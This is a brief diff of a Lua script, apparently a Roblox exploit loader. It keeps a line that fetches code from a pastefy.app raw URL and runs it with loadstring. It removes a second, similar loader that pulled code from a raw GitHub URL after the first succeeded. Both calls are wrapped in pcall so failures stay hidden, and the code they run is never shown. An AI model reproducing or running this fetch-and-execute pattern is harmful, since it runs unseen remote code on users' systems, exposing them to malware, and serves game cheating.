@@ -2,10 +2,3 @@
 local success1, _ = pcall(function()
     loadstring(game:HttpGet("https://pastefy.app/kjkfHdNI/raw", true))()
 end)
-
--- Script successfully!
-if success1 then
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/NoobRbl/Test/refs/heads/main/67"))()
-    end)
-end
